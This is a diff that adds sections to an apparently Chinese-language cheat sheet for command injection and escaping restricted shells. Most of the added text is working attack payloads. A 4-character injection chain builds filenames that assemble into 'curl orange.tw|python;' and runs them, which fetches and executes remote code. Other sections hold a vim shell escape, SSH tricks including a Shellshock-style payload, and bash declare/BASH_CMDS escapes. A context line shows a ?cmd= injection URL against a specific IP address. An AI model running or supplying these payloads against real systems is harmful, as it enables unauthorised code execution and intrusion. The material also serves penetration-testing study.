@@ -232,3 +232,66 @@ http://52.199.204.34/?cmd=*%20/h*
 ln /f*
 如果有一个 /flag.txt 文件将创建硬链接在当前文件夹中
 ```
+
+## 4个字符的命令注入
+
+```bash
+与之前的绕过方式类似，这个只需要 4 个字符来执行命令
+它遵循在文件中创建命令 `ls -t>g` 的相同原理
+然后在文件名中生成完整命令,生成"g> ht- sl"到文件v
+'>dir'
+'>sl'
+'>g\>'
+'>ht-'
+'*>v'
+
+将文件v反转为文件x，内容"ls -th >g"
+'>rev'
+'*v>x'
+
+生成 "curl orange.tw|python;"
+'>\;\\'
+'>on\\'
+'>th\\'
+'>py\\'
+'>\|\\'
+'>tw\\'
+'>e.\\'
+'>ng\\'
+'>ra\\'
+'>o\\'
+'>\ \\'
+'>rl\\'
+'>cu\\'
+
+获取shell
+'sh x'
+'sh g'
+```
+
+## 二进制文件
+
+[GTFO](https://gtfobins.github.io/)
+
+## VIM
+
+```bash
+:set shell=/bin/sh
+:shell
+```
+
+## SSH
+
+```bash
+ssh -t user@<IP> bash
+ssh user@<IP> -t "bash --noprofile -i"
+ssh user@<IP> -t "() { :; }; sh -i "
+```
+
+## Declare
+
+```bash
+declare -n PATH; export PATH=/bin;bash -i
+
+BASH_CMDS[shell]=/bin/bash;shell -i
+```
